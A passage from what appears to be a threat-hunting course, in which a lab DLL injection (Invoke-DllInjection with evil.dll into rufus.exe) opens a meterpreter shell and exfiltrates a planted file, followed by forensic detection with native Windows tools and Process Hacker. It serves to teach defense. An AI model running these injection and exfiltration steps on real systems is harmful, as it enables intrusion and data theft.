<p>We&rsquo;re about to do so, but before that there&rsquo;s one more thing we need. Remember in the beginning when I explained how DLL-injections work I said that we &ldquo;trick&rdquo; a legit process into running code from a malicious DLL? So this script we just injected into memory is what&rsquo;s going to be doing the trickery, we also have our malicious DLL which we transferred over, so that means we only need one more thing - a legit process.</p>
<p>Now it used to be the case that you could easily inject into any process, including native Windows processes like notepad and calculator. You&rsquo;ll notice if you do some older tutorials, they&rsquo;ll almost always choose one of these two as the example. However, this has become more complicated since Windows 10 since native applications will only load <a href="https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g">MS-signed libraries</a>.</p>
<figure class="custom-figure"><img src="/img/charlie.gif"/>
</figure>

<p>Though there are ways to circumvent this let&rsquo;s not overcomplicate things right now in this regard. Plus, it&rsquo;s not really all that unrealistic to expect a non-native Windows executable to be running on a victim&rsquo;s system, so I&rsquo;ll be running a random executable called <code>rufus.exe</code>. It&rsquo;s a small, simple program that creates bootable usb drives, but that&rsquo;s irrelevant - I really just arbitrarily chose it to have <em>some</em> non-MS process.</p>
<p>If you really wanted to run the same thing you can <a href="https://rufus.ie/en/">get it here</a>, otherwise feel free to run any other program as longs as its not a native Windows one.</p>
<p><strong>Let&rsquo;s run our process and inject into it:</strong></p>
<ol>
<li>
<p>Open <code>rufus.exe</code>, or whatever other non-MS application you chose.</p>
</li>
<li>
<p>We need to find the Process ID (PID) of <code>rufus.exe</code> since we&rsquo;ll pass that as an argument to our injection script. You can either run Task Manager from the gui, or here I&rsquo;ll be running <code>ps</code> in PowerShell. And we can see here the PID is 784.</p>
</li>
</ol>
<figure class="custom-figure"><img src="/img/image048.png"/>
</figure>

<ol start="3">
<li>And now all the pieces are in place so we can run our command. We can note that we provide it two things, first the PID of the legit process we want to inject into, and the path to the DLL we want to be injected. So run the command in the same administrative PowerShell terminal.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Invoke-DllInjection -ProcessID 784 -Dll C:\Users\User\Desktop\evil.dll
</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image049.png"/>
</figure>

<ol start="4">
<li>We see some output, now to know if it worked let&rsquo;s head on back to our Kali VM. We can immediately see that we received the connection and are now in a <code>meterpreter</code> shell - success!</li>
</ol>
<figure class="custom-figure"><img src="/img/popped_shell.gif"/>
</figure>

<figure class="custom-figure"><img src="/img/image050.png"/>
</figure>

<ol start="5">
<li>We can run a few commands if we&rsquo;d like, also we&rsquo;ll exfiltrate the &ldquo;nuclear launch codes&rdquo; we created in the beginning.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>download C:\\Users\\user\\Desktop\\tob_seekrit.txt /home/hacker/Desktop/
</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image051.png"/>
</figure>

<p>Additionally, we can also drop into a <code>shell</code>.</p>
<figure class="custom-figure-3"><img src="/img/image052.png"/>
</figure>

<p>That&rsquo;s it for our attack!</p>
<h1 id="236-artifact-consolidation">2.3.6. Artifact Consolidation</h1>
<p>Since our attack is finish, let&rsquo;s package our logs, traffic capture, and memory dump.</p>
<p><strong>Export Sysmon Log:</strong>
Run the following command in an administrative PowerShell terminal:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wevtutil epl &#34;Microsoft-Windows-Sysmon/Operational&#34; &#34;C:\Users\User\Desktop\SysmonLog.evtx”
</span></span></code></pre></div><p><strong>Export PowerShell Log:</strong>
In the same administrative PowerShell terminal export the PowerShell ScriptBlock logs:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wevtutil epl &#34;Microsoft-Windows-PowerShell/Operational&#34; &#34;C:\Users\User\Desktop\PowerShellScriptBlockLog.evtx&#34; &#34;/q:*[System[(EventID=4104)]]&#34;
</span></span></code></pre></div><p><strong>Export Traffic Capture:</strong>
Now let&rsquo;s stop our packet capture:</p>
<ol>
<li>Open WireShark.</li>
<li>Press the red STOP button.</li>
<li>Save the file, in my case I will save it to desktop as <code>dllattack.pcap</code>.</li>
</ol>
<p><strong>Export Sysmon Log:</strong>
And finally we&rsquo;ll dump the memory for our post-mortem analysis:</p>
<ol>
<li>Open a <code>Command Prompt</code> as administrator.</li>
<li>Navigate to the directory where you saved <code>winpmem</code>, in my case it&rsquo;s on the desktop.</li>
<li>We&rsquo;ll run the following command, meaning it will dump the memory and save it as <code>memdump.raw</code> in our present directory (desktop):</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>winpmem.exe memdump.raw
</span></span></code></pre></div><hr>
<h1 id="24-shenanigans-a-honest-review-of-our-attack">2.4. Shenanigans! A (honest) review of our attack</h1>
<p>OK so let&rsquo;s just hold zoom out and discuss the attack we just performed. At this point, if you have your wits about you, you might, and rightfully so I&rsquo;ll add, be calling <strong>shenanigans</strong> on me.</p>
<figure class="custom-figure-3"><img src="/img/shenanigans.gif"/>
</figure>

<p>&ldquo;Wait&rdquo;, I hear you say, &ldquo;if the whole point of infecting the victim and getting C2 control established is so that we can run commands on it, isn&rsquo;t it cheating then to be running these commands ahead of that actually happening&rdquo;?</p>
<p>Look at the meta: the whole point of establishing C2 on the victim is so we can run commands on it, but we literally just allowed ourselves to freely run commands on the victim so that we can establish C2. We wrote our malicious DLL to disk, injected our DLL-injection script into memory, and ran the script all from the comfort of Imaginationland.</p>
<figure class="custom-figure-3"><img src="/img/imagination.gif"/>
</figure>

<p>So then the answer is <em>yes</em>. That was cheating - of course. But, it&rsquo;s cheating with a purpose you see, the purpose here being that this is a course on threat hunting. So we stripped the actions of the initial compromise down to its core and for now we&rsquo;ve foregone our spearfishing email and VBA macro. We&rsquo;ve streamlined the essence of the attack - we&rsquo;re expending less energy in the effort, and yet for our intents have created the same outcome.</p>
<p>So, we won&rsquo;t be investing our time in completely recreating a realistic simulation of the intial compromise, <em>however</em>, I do think it&rsquo;s very important for us to discuss here what that would look like. We are about to embark on our threat hunt, which is an investigation; but there would be no value for us to go attempting to discover things that exists only because of our specific &ldquo;cheating&rdquo; method here.</p>
<p>Meaning: I want to make sure you understand which parts of the attack we just performed are representative of an actual attack, and which are not. The reason for this of course is so we can focus on what really matters - ie that which we expect to see following a real-life attack.</p>
<figure class="custom-figure-3"><img src="/img/focus.gif"/>
</figure>

<p>So the remainder of this section will be dedicated to that. I&rsquo;m very briefly going to review all the main beats to the attack we just performed, thereafter I&rsquo;ll &ldquo;translate&rdquo; the actions to a representative real-world counterpart, pointing out specifically which elements we expect to see in an actual attack, and which we don&rsquo;t.</p>
<p><strong>Here&rsquo;s what we just did in our attack:</strong></p>
<ol>
<li>We crafted a malicious DLL on our system.</li>
<li>We transferred this DLL over to the victim&rsquo;s system.</li>
<li>We opened a meterpreter handler on our system.</li>
<li>On the victim&rsquo;s sytem we then downloaded a powershell script from a web server, and injected it into memory.</li>
<li>We opened a legitimate program (<code>rufus.exe</code>).</li>
<li>We then ran the script we downloaded in #4, causing the malicious dll from #1 to be injected into the memory space of #5.</li>
<li>The injected DLL is executed, calling back to the handler we created in #3, thereby establishing our backdoor connection.</li>
<li>We exfiltrated some data using our meterpreter shell.</li>
<li>We used our meterpreter shell to spawn a command prompt shell.</li>
<li>We ran a simple command in the new shell (whoami).</li>
<li>We closed the connection.</li>
</ol>
<figure class="custom-figure"><img src="/img/dementors.gif"/>
</figure>

<p><strong>OK. Now let&rsquo;s review what an actual attack might have looked like:</strong></p>
<ol>
<li>An attacker does some recon/OSINT, discovering info that allows them to craft a very personalized email to a company&rsquo;s head of sales as part of a spearphishing attack.</li>
<li>The attacker included in this email a word document labelled &ldquo;urgent invoice&rdquo;, and by using some masterful social engineering techniques they convince the head of sales to immediately open the document to pay it.</li>
<li>Once the head of sales opens the invoice it runs an embedded VBA macro, which contains the adversary&rsquo;s malicious code.</li>
<li>This code can do many, and even all, of the things we did manually:
<ul>
<li>It can download the malicious DLL.</li>
<li>It can download and then inject the script responsible for performing the attack into memory.</li>
<li>It can also execute the actual script.</li>
</ul>
</li>
<li>Note however that the malicious code contained in the initial email will more than likely not do all three things as we described above. As described before, it will likely only act as a <em>stager</em> and execute each step in a stepped manner. There exists here, as in so many areas of cybersecurity, strategic trade-offs.</li>
<li>In our simulation we chose a program (<code>rufus.exe</code>) and even opened it ourselves. In an actual attack this highly improbable since it represents unnecessary risk. Rather, the attacker would select a process that is already running to inject into, which could even lead to elevated privileges. Other considerations would also be selecting processes that are less likely to be terminated or restarted.</li>
</ol>
<p>I hope this helps you understand how our attack lead to the same outcomes, but just followed another path to get there in the interest of ease and efficiency.</p>
<p>There is one final thing I want to address, another thing that, if you&rsquo;re paying attention you might be wondering why exactly we did this? If you take a moment to think about it, the initial VBA macro might as well simply just called back to the handler to establish a connection directly. This would have bypassed numerous steps (download + save dll, download + inject script, invoke script), each which represent a potential point of failure or detection. So why go through all this extra effort to get to the same result - a backdoor connection?</p>
<figure class="custom-figure-3"><img src="/img/ninja.gif"/>
</figure>

<p>The reason to go through these steps rather than just having the initial script call back to the handler is all about stealth. Yes our process might involve increased risk, but the end result is a connection mediated by an injected DLL and not an executable, which in general will be harder to detect. So again, this game is all about trade-offs: this process accepts a relatively higher degree of risk during the process of establishing itself on the victim&rsquo;s system, however once established it operates with a relatively lower degree of risk.</p>
<p>Ok friends, thanks for entertaining this little side quest. I do so consciously with the full intent of ensuring you understand the why as much as the how. For now however let&rsquo;s move onto the first phase of our actual threat hunt - live analysis using native windows tools.</p>
<hr>
<hr>
<h1 id="3-live-analysis-native-windows-tools">3. Live Analysis: Native Windows Tools</h1>
<h1 id="31-introduction">3.1. Introduction</h1>
<p>So our first analysis will be a quick review using standard (native) Windows tools. These tools are a quick way to get a finger on the pulse - they&rsquo;ll give us a broad overview of some important indicators while at the same time being limited in the depth of information.</p>
<p>So if we have at our disposal better tools, ie tools that can provide more information, why bother? I&rsquo;m of the belief (inspired by one the greats, <a href="https://twitter.com/strandjs">John Strand</a>), that even if there are better tools available you should <em>also</em> be able to do a basic analysis with the native Windows tools.</p>
<p>Tools may change, they come and go, or, you might land in a situation where they are, for whatever reason, unavailable. Knowing how to get a basic read with Windows tools in any situation covers your bases. Think of it as learning how to survive in the outdoors - yes you can always make a fire using a lighter, but there&rsquo;s a good reason to also learn how to make it, however cumbersome, with what&rsquo;s always available - it might just save your butt in case your lighter fails.</p>
<figure class="custom-figure"><img src="/img/survivorman2.gif"/>
</figure>

<hr>
<h1 id="32-theory">3.2. Theory</h1>
<p>You will benefit from understanding the <a href="https://www.faanross.com/posts/three_modes/">following short theoretical framework on the &lsquo;3 Modes of Threat Hunting&rsquo;</a>. I leave the decision of whether or not to read it up to you, though it will be referenced throughout the remainder of the course.</p>
<hr>
<h1 id="33-analysis">3.3. Analysis</h1>
<p>There are a number of things we can look at when we do a live analyis using the native tools, including: connections, processes, shares, firewall settings, services, accounts, groups, registry keys, scheduled tasks etc.</p>
<p>For this course we will only focus on connections and processes. If you are keen to learn more about how to investigate the other factors I suggest you watch <a href="https://www.youtube.com/watch?v=fEip9gl2MTA">this excellent talk by John Strand</a>.</p>
<figure class="custom-figure"><img src="/img/speech.gif"/>
</figure>

<h1 id="331-connections">3.3.1. Connections</h1>
<p>Let&rsquo;s run <code>netstat</code>, which will display active network connections and listening ports. After all, most malware serves merely as a way for the adversary to ultimately have a connection to the victim&rsquo;s machine to run commands and exfiltrate data.</p>
<p>So open a PowerShell admin terminal on our Windows 10 system and run the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>netstat -naob
</span></span></code></pre></div><p>Note in particular the inclusion of <code>o</code> and <code>b</code> in our command which will also show the PID, as well as name of executable, involved in each connection.</p>
<p>In the results we can immediately see a variety of connections, as well as ports our system is listening on. Let&rsquo;s especially pay attention to <code>ESTABLISHED</code> connections.</p>
<p>We scroll through the list and then as threat hunters something unusual should stick out to us:</p>
<figure class="custom-figure"><img src="/img/image071.png"/>
</figure>

<p>What exactly is unusual about this? Well even though <code>rundll32.exe</code> is a completely legitimate Windows process, it&rsquo;s used to load DLLs. The question then beckons: why exactly is it involved in an outbound connection?</p>
<p>In this case we can see it&rsquo;s connected to another system on our local network, but remember that&rsquo;s only because of our VLAN setup. In an actual attack scenario this would not be the case, meaning we see <code>rundll32.exe</code>, a process not known to be involved in creating network connections, being responsible for establishing a connection to a system outside of our network.</p>
<p>In a typical scenario we&rsquo;d immediately want to know more about this IP. Is it known? Is there a business use case associated with it? Are other systems on the network also connecting to it? Because if the answer to all those questions are no - well then we definitely have something weird on our hands.</p>
<figure class="custom-figure"><img src="/img/weirdal.gif"/>
</figure>

<p>So let&rsquo;s use our native Windows tools to learn more about this process. To do so  let&rsquo;s just note of our PID, as can be seen in the image above mine is <code>3948</code>, yours will be different.</p>
<h1 id="332-processes">3.3.2. Processes</h1>
<p>Let&rsquo;s learn more about this strange process, specifically: what command-line options were used to run it, what is it&rsquo;s parent process, and what DLLs are being used by the process.</p>
<p><strong>Let&rsquo;s have a look at the DLLs, staying in our PowerShell terminal we run:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>tasklist /m /fi &#34;pid eq 3948&#34;
</span></span></code></pre></div><figure class="custom-figure-3"><img src="/img/image072.png"/>
</figure>

<p>On quick glance nothing seems unusual about this output - no DLL sticks out as being out of placed for <code>rundll32.exe</code>. So for now let&rsquo;s move on with the knowledge that we can always circle back and dig deeper if need be.</p>
<p><strong>Next let&rsquo;s have a look at the Parent Process ID (PPID):</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wmic process where processid=3948 get parentprocessid
</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image073.png"/>
</figure>

<p>Great, we can see the PPID is <code>6944</code>, now let&rsquo;s figure out the name of the process it belongs to:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wmic process where processid=6944 get Name
</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image074.png"/>
</figure>

<p>We see thus that the name of the Parent Process, that is the name of the process that spawned <code>rundll32.exe</code> is <code>rufus.exe</code> - a program used to create bootable thumb drives.</p>
<p>On quick glance this too seems unusual - why is this app needing to call <code>rundll32.exe</code>? However, since we&rsquo;re not an expert on this program&rsquo;s design, this could potentially be part of its normal operation - we&rsquo;d have to jump in deeper to understand that.</p>
<figure class="custom-figure"><img src="/img/sus2.gif"/>
</figure>

<p>Let&rsquo;s keep the bigger picture in mind again - we came upon <code>rundll32.exe</code> because it created a network connection to an external IP. So in that sense, yes this is very weird - why is a program used to create bootable thumb drives spawning <code>rundll32.exe</code> which then creates a network connection?</p>
<p>One final thing here using our native tools, let&rsquo;s have a look at the command-line arguments:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wmic process where processid=3948 get commandline
</span></span></code></pre></div><figure class="custom-figure"><img src="/img/image075.png"/>
</figure>

<p>We can see the command is nude - no arguments are provided. Well, since again the <code>rundll32.exe</code> command is typically used to execute a function in a specific DLL file, you would expect to see it accompanied by arguments specifying the DLL file and function it&rsquo;s supposed to execute. But here it&rsquo;s simply executed by itself, again reinforcing our suspicion that something is amiss.</p>
<hr>
<h1 id="34-closing-thoughts">3.4. Closing Thoughts</h1>
<p>Again we started with an open mind, spotten an unusual process being involved in a network connection, and then using other native Windows tools learned more about this process. And the more we learned, the more our suspicion was confirmed:</p>
<ul>
<li>The parent-child relationship is unusual.</li>
<li>The need for the parent relationship to ultimately create a network connection is unusual.</li>
<li>The fact that the process was ran without command-line arguments was unusual.</li>
</ul>
<p>Now that our suspicion is well and truly aroused let&rsquo;s dig in deeper to build our case using <code>Process Hacker</code>.</p>
<hr>
<hr>
<h1 id="4-live-analysis-process-hacker">4. Live Analysis: Process Hacker</h1>
<h1 id="41-introduction">4.1. Introduction</h1>
<p>I explained, hopefully in a somewhat convincing manner, why it&rsquo;s good practice for us to learn how to use the native Windows tools to get an initial, high-level read. But of course these tools are also limited in what information they can provide.</p>
<p>So now let&rsquo;s bring out the big guns and learn all we can.</p>
<figure class="custom-figure"><img src="/img/guns.gif"/>
</figure>

<p>As these things go, it really behooves us to learn a bit of theory behind what we&rsquo;re going to look at with the intention of understanding why it is we are looking at these things, and what exactly we will be looking for.</p>
<hr>
<h1 id="42-theory">4.2. Theory</h1>
<p><em><strong>&ldquo;A traditional anti-virus product might look at my payload when I touch disk or load content in a browser. If I defeat that, I win. Now, the battleground is the functions we use to get our payloads into memory. -Raphael Mudge&rdquo;</strong></em></p>
<p>There are a few key properties we want to be on the lookout for when doing live memory analysis with something like <code>Process Hacker</code>. But, it&rsquo;s very important to know that there are <strong>NO silver bullets</strong>. There are no hard and fast rules where if we see any of the following we can be 100% sure we&rsquo;re dealing with malware. After all, if we could codify the rule there would be no need for us as threat hunters to do it ourselves - it would be trivial to simply write a program that does it automatically for us.</p>
<p>Again we&rsquo;re building a case, and each additional piece of evidence serves to decrease the probability of a false positive. We keep this process up until our threshold has been reached and we&rsquo;re ready to push the big red button.</p>
<figure class="custom-figure"><img src="/img/redbutton.gif"/>
</figure>

<p>Additionally, the process as outlined here may give the impression that it typically plays out as a strictly linear process. This is not necessarilly the case - instead of going through our list 1-7 below, we could jump around not only on the list itself, but with completely different  techniqes.</p>
<p>As a simple example - if we find a suspicious process by following this procedure, we might want to pause and have the SOC create a rule to scan the rest of the network looking for the same process. If we for example use <strong>Least Frequency Analysis</strong> and we see the process only occurs on one or two anomalous systems, well that then not only provides supporting evidence, but also gives us the confirmation that we are on the right path and should continue with our live memory analysis.</p>
<figure class="custom-figure-2"><img src="/img/rabbit.gif"/>
</figure>

<p><strong>Here&rsquo;s a quick overview of our list:</strong></p>
<ol>
<li>Parent-Child Relationships</li>
<li>Signature - is it valid + who signed?</li>
<li>Current directory</li>
<li>Command-line arguments</li>
<li>Thread Start Address</li>
<li>Memory Permissions</li>
<li>Memory Content</li>
</ol>
<p><strong>Let&rsquo;s explore each a little more:</strong></p>
<ol>
<li><em><strong>Parent-Child Relationships</strong></em></li>
</ol>
<p>As we know there exists a tree-like relationship between processes in Windows, meaning an existing process (<code>parent</code>), typically spawns other processes (<code>child</code>). And since in the current age of <code>Living off the Land</code> malware the processes themselves are not inherently suspicious - after all they are legit processes commonly used by the system - we are more interested in the relationship between processes. We should always ask: <em>what spawned what</em>?</p>
<figure class="custom-figure"><img src="/img/minime.gif"/>
</figure>

<p>We&rsquo;ll often find a parent process that is not suspicious by itself, or equally, that viewed in isolation is completely routine. But the fact that this specific parent spawned that specific child - we&rsquo;ll sometimes that&rsquo;s the thing that&rsquo;s off.</p>
<p>And of course we&rsquo;ve already encountered this exact situation in the previous section with neither <code>rufus.exe</code> nor <code>rundll32.exe</code> being suspicious, but the fact that the former is spawned the latter being unusual.</p>
<p>Something else worth being aware of is not only may certain parent-child relationships indicate that something is suspicious, but the specifics can act as some sort of signature implying what malware is involved.</p>
<p>For example a classical <code>Cobalt Strike</code> process tree might look like this:</p>
<figure class="custom-figure-2"><img src="/img/image076.png"/>
</figure>

<p>At the top we can see WMI spawning PowerShell - that itself is pretty uncommon, but used by a variety of malware software. But there&rsquo;s more - PowerShell spawning PowerShell. Again, not a smoking gun, but unusual, and something seen with Cobalt Strike.</p>
<p>But really the most idiosyncratic property here is the multiple instances of <code>rundll32.exe</code> being spawned. This is classical Cobalt Strike behavior - the use of so-called <em><strong>sacrificial process</strong></em>. Plus the fact that it&rsquo;s <code>rundll32.exe</code> in particular - using this process name is the default setting for Cobalt Strike.</p>
<p>It might surprise you but <em>in situ</em> it&rsquo;s estimated that about 50% of adversaries never bother changing the default settings. Which makes one wonder - are they lazy, or are we so bad at detecting even default settings that they don&rsquo;t see the point in even bothering?</p>
<figure class="custom-figure-3"><img src="/img/thinkabout.gif"/>
</figure>

<p>All this to say - we&rsquo;ll look for unusual parent-child Relationships, and we&rsquo;ll do so typically by looking at a <code>process tree</code> which shows as all processes and their associated relationships. In the discussion above I might have given the impression that these relationships all exist in pairs with a unidirectional relationship. Not so, just as in actual family trees a parent can spawn multiple children, and each of these can in turn spawn their own children etc. So depending on the exact direction of the relationship, any specific process may be a parent or a child.</p>
<ol start="2">
<li><em><strong>Signature - is it valid + who signed?</strong></em></li>
</ol>
<p>This is definitely one of the lowest value indicators - something that&rsquo;s nice to help build a case, but by itself, owing to so many potential exceptions, is frankly useless. Nevertheless it is worth being aware of - whether the process is unsigned, or signed by an untrusted source.</p>
<ol start="3">
<li><em><strong>Current directory</strong></em></li>
</ol>
<p>There are a number of things we can look for here. For example we might see a process run from a directory we would not expect - instead of <code>svchost.exe</code> running from <code>C:\Windows\System32</code>, it ran from <code>C:\Temp</code> - <strong>UH-OH</strong>.</p>
<figure class="custom-figure-2"><img src="/img/dogjeez.gif"/>
</figure>

<p>Or, perhaps we see PowerShell, but it&rsquo;s running from <code>C:\Windows\Syswow64\...</code>, which by itself is a completely legitimate directory. But what exactly is its purpose?</p>
<p>It essentially indicates that 32-bit code was executed. While 32-bit systems are still in use, the majority of contemporary systems are 64-bit. However, many malware programs prefer using 32-bit code because it offers broader compatibility, allowing them to infect both 32-bit and 64-bit systems.</p>
<p>So if we saw PowerShell running from that directory, it means that a 32-bit version of PowerShell ran on a 64-bit OS, which is not what we expect in ordinary circumstances.</p>
<ol start="4">
<li><em><strong>Command-line arguments</strong></em></li>
</ol>
<p>We already saw this in the previous section - for example though running <code>rundll32.exe</code> is completely legit, we would expect it to have arguments referencing the exact function and library it&rsquo;s supposed to load. Seeing it nude, well that&rsquo;s strange.</p>
<figure class="custom-figure-2"><img src="/img/dwight-naked.gif"/>
</figure>

<p>Same goes for many other processes - we need thus to understand their function and how they are invoked to be able to determine the legitimacy of the process.</p>
<ol start="5">
<li><em><strong>Thread Start Address</strong></em></li>
</ol>
<p>When a DLL is loaded in the traditional way, ie from a disk, the operating system memory-maps the DLL into the process&rsquo;s address space. Memory mapping is a method used by the operating system to load the contents of a file into a process&rsquo;s memory space, which allows the process to access the file&rsquo;s data as if it were directly in memory. The operating system also maintains a mapping table that tracks where each DLL is loaded in memory.</p>
<figure class="custom-figure-3"><img src="/img/binoculars.gif"/>
</figure>

<p>With traditional DLL loading, if you were to look at the start address of the thread executing the DLL, you would see some memory address indicating where the DLL has been loaded in the process&rsquo;s address space.</p>
<p>However, in the case of Reflective DLL Injection, the DLL is loaded into memory manually without the involvement of the operating system&rsquo;s regular DLL-loading mechanisms. The custom loader that comes with the DLL takes care of mapping the DLL into memory, and the DLL never touches the disk. Since the operating system isn&rsquo;t involved in the process, it doesn&rsquo;t maintain a mapping table entry for the DLL, and as such, the start address of the thread executing the DLL isn&rsquo;t available.</p>
<p>As a result, when you inspect the start address of the thread associated with the injected DLL, it will not show the actual memory address where the DLL is loaded. Instead, it will show <code>0x0</code>, which essentially means the address is unknown or not available - see image below. This is one of the many ways Reflective DLL Injection can be stealthy and evade detection.</p>
<figure class="custom-figure-3"><img src="/img/image077.png"/>
</figure>

<ol start="6">
<li><em><strong>Memory Permissions</strong></em></li>
</ol>
<p>One of the most common, well-known heuristics for injected malware is any memory region with <code>RWX</code> permissions. Memory with <code>RWX</code> permissions means that code can be written into that region and then subsequently executed. This is a capability that malware often utilizes, as it allows the malware to inject malicious code into a running program and then execute that code. The <em>vast</em> majority of legitimate software will not behave in this manner.</p>
<figure class="custom-figure"><img src="/img/dog-drag.gif"/>
</figure>

<p>But be forewarned - <code>RWX</code> permissions are the tip of the iceberg in this game of looking for anomalies in memory permissions.</p>
<p>Modern malware authors, knowing <code>RWX</code> not only sticks out like a sore thumb but can easily be detected with a <code>Write XOR Execute</code> security policy, might instead create malware to have an initial pair of permissions (<code>RW</code>), which will then afterwards change permissions to <code>RX</code>.</p>
<p>I wanted you to be aware of this, but for now we will focus only on <code>RWX</code>.</p>
<ol start="7">
<li><em><strong>Memory Content</strong></em></li>
</ol>
<p>Once we find a memory space with unusual permissions we then also want to check its content for signs of a PE file. Let&rsquo;s quickly have a look at a typical PE file structure:</p>
<figure class="custom-figure-3"><img src="/img/image078.png"/>
</figure>

<p>We can see two things that always stick out: the magic bytes <code>MZ</code> and a vestigial string associated with the <code>DOS Stub</code>. Magic bytes are predefined unique values used at the beginning of a file that are used to identify the file format or protocol. For a PE file, we would expect to see the ASCII character <code>MZ</code>, or <code>4D 5A</code> in hex.</p>
<p>Then the string <code>This program cannot be run in DOS mode</code> is an artifact from an era that some systems only ran DOS. However the string is still kept there, mainly historical reasons. For us in this case however it&rsquo;s a useful thumbprint, informing us we&rsquo;re dealing with a PE file.</p>
<p>Further, in the rest of the contents we might be able to find some strings that are associated with specific malware. And typically, rather than trudging it manually we can automate the process using <a href="https://github.com/VirusTotal/yara/releases">YARA</a> rules.</p>
<p>For example below we can see <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_wilted_tulip.yar">Yara rules authored by Florian Roth for Cobalt Strike</a>. The image shows a number of string-based rules it would be looking for - all indications that the PE file is part of a Cobalt Strike attack.</p>
<figure class="custom-figure"><img src="/img/image079.png"/>
</figure>

<p>Finally it&rsquo;s worth being aware of <code>PE Header Stomping</code> - a more advanced technique used by some attackers to avoid detection. As another great mind in the Threat Hunting space, <a href="https://twitter.com/chris_brenton?lang=en">Chris Benton</a>, likes to say: <em><strong>&ldquo;Malware does not break the rules, but it bends them&rdquo;.</strong></em></p>
<p>PE files <em>have</em> to have a header, but since nothing really forces or checks the exact contents of the header, the header could theoretically be anything. And so instead of the header containing some giveaways like we saw above - magic bytes, dos stub artifact, signature strings etc - the malware will overwrite the header with something else to appear legitimate. For now I just wanted you to be aware of this, we&rsquo;ll revisit header stomping first-hand in the future.</p>
<figure class="custom-figure-3"><img src="/img/ramones.gif"/>
</figure>

<p>But for now, that&rsquo;s it for the theory - <em>allons-y</em>!</p>
<hr>
<h1 id="43-analysis">4.3. Analysis</h1>
<p>Open Process Hacker as admin - ie right-click and select <code>Run as administrator</code>. Scroll down until you see <code>rufus.exe</code> (or whatever other legitimate process you chose to inject into). Let&rsquo;s go through our 7 indicators.</p>
<ol>
<li><strong>Parent-Child relationships</strong></li>
</ol>
<figure class="custom-figure"><img src="/img/image053.png"/>
</figure>

<p>We can immediately see the same suspicious process and parent we saw in our analysis using native tools - there is the legitimate process <code>rufus.exe</code>, which unexpectedly spawned the child process <code>rundll32.exe</code>.</p>
<p>But then we see something else we forgot to consider in our previous analysis - has <code>rundll32.exe</code> itself spawned anything in turn? Indeed <code>rundll32.exe</code> has in turn spawned <code>cmd.exe</code>.</p>
<p>I mentioned before that <code>rundll32.exe</code> is typically used to launch DLLs. There is thus little reason for us to expect it to be spawning the Windows command line interpreter <code>cmd.exe</code>. Now it could be that some amateur developer wrote some janky code that does this as some befuddling workaround, but that&rsquo;s steelmanning it to the n-th degree.</p>
<figure class="custom-figure"><img src="/img/steelman.gif"/>
</figure>

<p>We&rsquo;re not ringing the alarm bells yet, but we&rsquo;re definitely geared to dig in deeper.</p>
<p>Let&rsquo;s double-click on the process <code>rundll32.exe</code>&hellip;</p>
<ol start="2">
<li><strong>Signature - is it valid + who signed?</strong></li>
</ol>
<figure class="custom-figure-2"><img src="/img/image054.png"/>
</figure>

<p>We can see here that it has a valid signature signed by Microsoft, since of course they are the creators of <code>rundll32.exe</code>. Nothing further to concern ourselves with here.</p>
<ol start="3">
<li><strong>Current directory</strong></li>
</ol>
<p>In the same image, we can see the <strong>Current directory</strong>, which is the &ldquo;working directory&rdquo; of the process. This refers to the directory where the process was started from or where it is currently operating. We can see here that the current directory is the desktop, since that&rsquo;s where it was initiated from.</p>
<figure class="custom-figure-2"><img src="/img/where_you.gif"/>
</figure>

<p>Now this could happen with legitimate scripts or applications that are using <code>rundll32.exe</code> to call a DLL function. However, seeing <code>rundll32.exe</code> being called from an unusual location like a user&rsquo;s desktop could be suspicious, particularly if it&rsquo;s coupled with other strange behavior.</p>
<ol start="4">
<li><strong>Command-line arguments</strong></li>
</ol>
<p>And again in reference to the same image we once more we see that the <strong>Command-line</strong> is <code>rundll32.exe</code>. We already saw this before where I discussed why this is suspicious - we expect <code>rundll32.exe</code> to be provided with arguments.</p>
<ol start="5">
<li><strong>Thread Start Address</strong></li>
</ol>
<p>On the top of the Properties window select the <code>Threads</code> tab.</p>
<figure class="custom-figure-3"><img src="/img/image055.png"/>
</figure>

